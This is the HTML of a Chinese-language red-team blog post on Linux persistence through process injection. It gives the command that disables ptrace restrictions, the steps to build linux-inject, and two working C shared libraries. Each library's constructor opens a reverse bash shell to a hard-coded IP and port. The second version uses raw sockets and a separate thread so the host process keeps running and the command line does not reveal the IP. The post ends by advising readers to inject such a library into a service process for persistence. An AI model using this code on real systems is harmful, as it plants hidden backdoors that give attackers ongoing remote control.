@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Linux权限维持之进程注入 « 倾旋的博客</title>
+  <meta name="description" content="说明通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用ptrace()实现了与Windows平台下相同作用的API 函数CreateRemoteThread()。在许多Linux发行版中，内核的默认配置文件/proc/sys/kernel/yama/ptrace_sco...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2020-01-01/2">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Linux权限维持之进程注入</h1>
+    <p class="post-meta">Jan 1, 2020</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="说明">说明</h2>
+
+<p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code class="language-plaintext highlighter-rouge">ptrace()</code>实现了与Windows平台下相同作用的API 函数<code class="language-plaintext highlighter-rouge">CreateRemoteThread()</code>。在许多Linux发行版中，内核的默认配置文件<code class="language-plaintext highlighter-rouge">/proc/sys/kernel/yama/ptrace_scope</code>限制了一个进程除了<code class="language-plaintext highlighter-rouge">fork()</code>派生外，无法通过<code class="language-plaintext highlighter-rouge">ptrace()</code>来操作另外一个进程。</p>
+
+<p>要注入进程前，需要关闭这个限制（Root权限）：</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/28f181718173d69326f3bfc58a3c0cbb.png" alt="2020-01-03-13-10-44"></p>
+
+<p>在Github上已经有了关于进程注入的实现代码：<code class="language-plaintext highlighter-rouge">https://github.com/gaffe23/linux-inject</code></p>
+
+<p>下载后进入项目目录，执行：make x86_64 即可编译64位的linux-inject。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7b89dc61d7952191a608716bdcf951b8.png" alt="2020-01-03-13-10-54"></p>
+
+<p>确认编译是否正常：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8251535f3c0f9b55243940b6de2cf34b.png" alt="2020-01-03-13-11-04"></p>
+
+<p>获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。
+接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+
+<span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"I just got loaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"bash -c </span><span class="se">\"</span><span class="s">bash -i &gt;&amp; /dev/tcp/192.168.170.138/139 0&gt;&amp;1</span><span class="se">\"</span><span class="s">"</span><span class="p">);</span>
+   
+<span class="p">}</span>
+
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+<span class="kt">void</span> <span class="nf">loadMsg</span><span class="p">()</span>
+<span class="p">{</span>
+   <span class="n">shell</span><span class="p">();</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>通过如下命令编译so文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o u9.so -lpthread -fPIC U3.c
+
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ae110053d720c18b8c6bfb24a5483d4b.png" alt="2020-01-03-13-11-16"></p>
+
+<p>编译成so文件成功后的测试效果：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d23ecdf9310a3dce4fd8839d9d10e270.png" alt="2020-01-03-13-11-27"></p>
+
+<p>在Kali Linux这边获得了bash shell：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/c2d15b84db450b39e55766b2097fd0c2.png" alt="2020-01-03-13-11-47"></p>
+
+<p>此时发现测试程序的主线程被bash阻塞了，于是可以采用多线程技术，将后门代码与正常逻辑分离执行。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9e990f101b1f5bee215f4175926ac896.png" alt="2020-01-03-13-11-58"></p>
+
+<p>但利用这种方式在执行的过程中，查看进程参数还是会被查看到IP地址和端口：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b920dfc70a90769b21214fd5d217dbbc.png" alt="2020-01-03-13-12-09"></p>
+
+<p>查看到IP与端口：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/5f6901fde3fc0693424326f3deeede92.png" alt="2020-01-03-13-12-19"></p>
+
+<p>再继续改进代码，采用socket套接字的方式来反弹shell：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="o">*</span> <span class="nf">hello</span><span class="p">()</span>
+<span class="p">{</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">sock</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">shell</span><span class="p">[]</span><span class="o">=</span><span class="s">"/bin/bash"</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">((</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">139</span><span class="p">);</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">"192.168.170.138"</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">dup2</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">execl</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span><span class="s">"/bin/bash"</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"I just got loaded</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span>
+<span class="kt">void</span> <span class="nf">loadMsg</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">pthread_t</span> <span class="n">thread_id</span><span class="p">;</span>
+    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">thread_id</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="n">hello</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
+
+<p>执行效果：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fa4136ff8822c555b4008bce084f88a4.png" alt="2020-01-03-13-12-35"></p>
+
+<p>Kali Linux获得bash shell：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/003ee8252435ab25e2b012763fbf8d82.png" alt="2020-01-03-13-12-46"></p>
+
+<p>在实战应用中，需要关闭ptrace的限制，然后注入.so到某个服务进程中，这样达到权限维持的目的。</p>
+
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
